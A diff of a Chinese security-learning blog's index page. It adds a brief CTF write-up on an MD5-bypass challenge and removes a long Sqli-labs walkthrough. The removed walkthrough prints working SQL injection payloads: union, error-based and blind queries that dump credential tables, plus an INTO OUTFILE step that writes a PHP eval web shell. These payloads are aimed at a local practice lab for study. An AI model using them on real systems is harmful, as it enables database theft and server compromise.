@@ -158,6 +158,83 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/10/BJDCTF2020-Easy-MD5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/10/BJDCTF2020-Easy-MD5/" class="post-title-link" itemprop="url">BJDCTF2020-Easy-MD5</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-10 15:55:36 / 修改时间：18:07:24" itemprop="dateCreated datePublished" datetime="2021-02-10T15:55:36+08:00">2021-02-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><h6 id="1-题目：MD5绕过"><a href="#1-题目：MD5绕过" class="headerlink" title="1.题目：MD5绕过"></a>1.题目：MD5绕过</h6><h6 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h6><p>LazyDogR4U和Post to zuckonit的MD5是没怎么接触过的……就挑一道MD5的题写叭……</p>
+<p>结果一上来就是：</p>
+<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210160914735.png" alt="image-20210210160914735"></p>
+<p>pass应该是可以控制的变量……构造MD5后的变量</p>
+<p>*<em>md5(\</em>string,raw*)**：</p>
+<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210161233308.png" alt="image-20210210161233308"></p>
+<p>但我折腾半天，网上写的都是什么mysql解释16进制、ASCII编码成字符串、hex之类的……看得不是很懂</p>
+<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210174311851.png" alt="image-20210210174311851"></p>
+<p>反正直接就出了，所以应该讨论的是：MD5的32位密文与16位密文的转换。</p>
+<blockquote>
+<p>md5的输出只有128bit一种<br>32个byte，或者32个ascii可显示字符形du式的是zhi其hex码的显示形式<br>16个byte是其直dao接输出形式。<br>16*8=128bit<br>这里只要把每4bit用一个char表示，就成了32个byte的可打印显示形式</p>
+</blockquote>
+<p>这里的理解为写脚本（抄脚本）产生了一定的阻碍……</p>
+<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210175411054.png" alt="image-20210210175411054"></p>
+<p>找了几个脚本碰撞，结果碰了一上午也没碰出来……</p>
+<p>自己想写一个长度增长的枚举，结果代码水平太差了……一般网上的脚本也是指定长度……唉，我还是用答案叭</p>
+<p>争取以后自己写一个顺手的截断的枚举（php会不会更好使……），这玩意用到的时候没有就挺恶心的………</p>
+<p>后面两个就直接用数组绕过就行了……</p>
+<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210180610545.png" alt="image-20210210180610545"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/09/SUCTF-2019-CheckIn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -883,205 +960,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/25/Sqli-labs/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/25/Sqli-labs/" class="post-title-link" itemprop="url">Sqli-labs</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-01-25 09:14:28" itemprop="dateCreated datePublished" datetime="2021-01-25T09:14:28+08:00">2021-01-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-26 23:41:28" itemprop="dateModified" datetime="2021-01-26T23:41:28+08:00">2021-01-26</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>先用or 1=1，只显示一条结果，应该有limit语句……</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+</span><br></pre></td></tr></table></figure>
-
-<p>判断列数以便使用联合查询，发现有三列。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sqli-labs/image-20210125092719056.png" alt="image-20210125092719056"></p>
-<p>正常回显，当前库是security。</p>
-<p>查表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sqli-labs/image-20210125094000614.png" alt="image-20210125094000614"></p>
-<p>查字段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),3--+</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/Sqli-labs/image-20210125094309642.png" alt="image-20210125094309642"></p>
-<p>可以查询用户名与密码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sqli-labs/image-20210125094559177.png" alt="image-20210125094559177"></p>
-<p>Less-1结束……</p>
-<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>?id=1 and 1=2 无回显，数值型注入……</p>
-<p>order by 3 即有三列。</p>
-<p>用的好像还是security库……</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sqli-labs/image-20210125100314265.png" alt="image-20210125100314265"></p>
-<p>em，和Less-1差不多……</p>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>?id=1’回显有点奇怪……</p>
-<p><img src="/images/Sqli-labs/image-20210125100534807.png" alt="image-20210125100534807"></p>
-<p>那一部分应该是：**’1”) LIMIT 0,1**，应该是id=(‘$id’) </p>
-<p>?id=1’)–+   回显正常</p>
-<p>?id=1’) order by 3–+ 有3列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39;) union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Sqli-labs/image-20210125101316132.png" alt="image-20210125101316132"></p>
-<p>OK</p>
-<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>?id=1’’’’’’’’’’’’’’’’’’–+123156hbhj–+</p>
-<p>没有任何的报错……应该是都被认为是字符了</p>
-<p>?id=1” 报错：</p>
-<p><img src="/images/Sqli-labs/image-20210125102444211.png" alt="image-20210125102444211"></p>
-<p>这里大概是：id=(“$id”)</p>
-<p>?id=1”)–+  回显正常</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&quot;) union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以了……</p>
-<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p><img src="/images/Sqli-labs/image-20210125102858654.png" alt="image-20210125102858654"></p>
-<p>emm……不太懂，查一波。</p>
-<p>这波大概是盲注，盲注也有很多种……</p>
-<p><img src="/images/Sqli-labs/image-20210125103101029.png" alt="image-20210125103101029"></p>
-<p><img src="/images/Sqli-labs/image-20210126103939343.png" alt="image-20210126103939343"></p>
-<p>?id=1’ and left(database(),1)=’s’–+  //一位一位判断库名</p>
-<p>?id=1’ and if(length(database())=8,sleep(1),1)–+  //利用时间延迟判断猜测是否正确3</p>
-<p>结合burpsuit可以更方便一些……</p>
-<p>还有更强的方法：双查询联合注入</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257">详细讲解双查询注入csdn</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BloodZero/p/4660971.html">双查询注入（大佬）</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">sql注入之双查询注入（简书）</a></p>
-<p>这些文章都尽可能的解释了这个方法……</p>
-<p><a target="_blank" rel="noopener" href="https://www.1keydata.com/cn/sql/sql-groupby.php">group by 的说明</a></p>
-<p><img src="/images/Sqli-labs/image-20210126114614150.png" alt="image-20210126114614150"></p>
-<p>理解一波，不知道对不对……</p>
-<p>group by 读取时，查找字段名中是否有key，没有则插入。但是每次读取判断时，floor(random(0)*2)是随机的0或1……所以概率出现重复插入的情况，此时会发生报错，报错内容回显出database()的内容。</p>
-<p>eg：*<strong>?id=’ union select count(*),count(*),concat(‘<del>‘,(select database()),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+*</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_func_count_ast.asp">那这个count(*)又有什么作用……</a></p>
-<p>本以为是像select 1，2，3一样占行数的……但改成1和2又会不起效果……</p>
-<p>必须有一个count(*)才行……</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">这个看着差不多</a>，结合自己理解一波：</p>
-<p><img src="/images/Sqli-labs/image-20210126170317765.png" alt="image-20210126170317765"></p>
-<p><img src="/images/Sqli-labs/image-20210126170944295.png" alt="image-20210126170944295"></p>
-<p>先以语句结果去寻找，找不到，插入语句重新计算得到的结果。这样的话，表至少有两列，这个方法才能成功（至少遍历两次才能产生冲突）。若第二次找不到，则插入新结果，此时还要计算对应的count，遍历数据。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aspirant/p/8983901.html">SQL有三个类型的索引，唯一索引 不能有重复，但聚集索引，非聚集索引可以有重复</a></p>
-<p>主键key默认是唯一索引。count的再次遍历发现了主键索引的冲突，报错。大概是这样？……</p>
-<p>还有，再查当前库时，可以用：**?id=-1’ union select n from n–+**</p>
-<p><img src="/images/Sqli-labs/image-20210126172631743.png" alt="image-20210126172631743"></p>
-<p>直接得到security……不过好像只能干这个……</p>
-<p>?id=’ union select 1,count(*),concat(‘<del>‘,(select database()),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+</p>
-<p>查当前库</p>
-<p>?id=-1’ union select count(*),1, <strong>concat(‘~’,(select concat(table_name) from information_schema.tables where table_schema=database() limit x,1)</strong>,’~’,floor(rand()*2)) as a from information_schema.tables group by a–+</p>
-<p>修改x可以查各个表名</p>
-<p>?id=-1’ union select count(*),1, <strong>concat(‘~’,(select column_name from information_schema.columns where table_name=’users’ limit x,1)</strong>,’~’,floor(rand()*2)) as a from information_schema.tables group by a–+</p>
-<p>修改x可以查各个列名</p>
-<p>?id=-1’ union select count(*),1, <strong>concat(‘~’,(select concat_ws(‘[‘,password,username) from users limit x,1)</strong>,’~’,floor(rand()*2)) as a from information_schema.tables group by a–+</p>
-<p>修改x可以查各个字段</p>
-<p>百分百成功(大概)：rand()里面的seed调为小于等于0，对于指定的seed，rand的值相同。但是是什么，为什么我都不知道……我也是试出来的，也查不清楚……</p>
-<p>回来再试试~~</p>
-<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>?id=1” 报错</p>
-<p><img src="/images/Sqli-labs/image-20210126181005116.png" alt="image-20210126181005116"></p>
-<p>?id=1”–+成功</p>
-<p>?id=-1” union select count(*),1, <strong>concat(‘~’,(select concat(table_name) from information_schema.tables where table_schema=database() limit x,1)</strong>,’~’,floor(rand()*2)) as a from information_schema.tables group by a–+      查表</p>
-<p>差不多……</p>
-<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p><img src="/images/Sqli-labs/image-20210126181512238.png" alt="image-20210126181512238"></p>
-<p>outfile又不懂辽……</p>
-<p>?id=1’–+ 只提示有错误……没有错误的回显了。查资料辽。</p>
-<p>?id=1‘)) and (select count(*) from mysql.user)&gt;0 –+ </p>
-<p>判断有没有文件写入权限，不过只显示有错误，不知道是不是语法错误……</p>
-<p>?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,1) –+ 进入，应该是没有写入/写出权限</p>
-<p>关于file权限：</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 必须有权限读取并且文件必须完全可读 </span><br><span class="line">2 目的文件必须在服务器上 </span><br><span class="line">3 必须指定文件完整的路径 </span><br><span class="line">4 欲读取文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>由于phpstudy的设置，所以在网站上操作没有权限，好像是secure_file_priv需要设置一下……</p>
-<p>更改之后：?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,0) –+ 成功进入</p>
-<p>导出文件：?id=1’)) union select 1,database(),user() into outfile “D:\pp.txt”–+ 报错但文件成功导出。</p>
-<p><img src="/images/Sqli-labs/image-20210126224148354.png" alt="image-20210126224148354"></p>
-<p>*<em>?id=’)) union select * from users into outfile “D:\apap.txt”–+*</em></p>
-<p><img src="/images/Sqli-labs/image-20210126230104531.png" alt="image-20210126230104531"></p>
-<p>OK。</p>
-<p>导入文件：</p>
-<p>?id=1’)) union select 1,2,’&lt;?php @eval($_POST[“b”])?&gt;‘ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\b.php”–+</p>
-<blockquote>
-<p>反斜杠“\”是Windows系统文件目录结构使用的分隔符，如：D:\我的文档。只有 windows 支持反斜杠路径符 \ ，而unix支持 /</p>
-<p>但是我们还应该知道 \ 也是转义字符，在url中他会当成转义字符处理，所以我们用 \ 对反斜杠进行转义，那么结果就变成了一个反斜杠</p>
-</blockquote>
-<p><img src="/images/Sqli-labs/image-20210126225640997.png" alt="image-20210126225640997"></p>
-<p>成功连接。</p>
-<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>这次彻底没有任何错误回显了……</p>
-<p>只能一位一位注…同Less-5的第一种方法：</p>
-<p>?id=1’ and left(database(),1)=’s’–+  //一位一位判断库名</p>
-<p>?id=1’ and if(length(database())=8,sleep(1),1)–+  //利用时间延迟判断猜测是否正确</p>
-<p>结合burpsuit可以更方便一些……不用bp也可以用二分法。</p>
-<p><img src="/images/Sqli-labs/image-20210126103939343.png" alt="image-20210126103939343"></p>
-<p>?id=1’ and if(left((select table_name from information_schema.tables where table_schema=database() limit x,1),1)=’r’ , sleep(1), 1) –+   //查表</p>
-<p>?id=1’ and if(left((select column_name from information_schema.columns where table_name=’users’ limit x,1),1)=’a’, sleep(1), 1) –+   //查列</p>
-<p>?id=1’ and if(left((select password from users limit 0,1),4)=’dumb’ , sleep(1), 1) –+    //查数据</p>
-<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p><img src="/images/Sqli-labs/image-20210126232436182.png" alt="image-20210126232436182"></p>
-<p>em，和Less-8是一样的。</p>
-<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>不论怎么打，都是“You are in”……</p>
-<p>源代码：</p>
-<p><img src="/images/Sqli-labs/image-20210126233825832.png" alt="image-20210126233825832"></p>
-<p>$id的值左右拼接了“ ”；这样处理的话只能用and去判断</p>
-<p>所以用双引号就行了……其他和Less-8是一样的。</p>
-<p><strong>1-10:OK</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1153,7 +1031,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
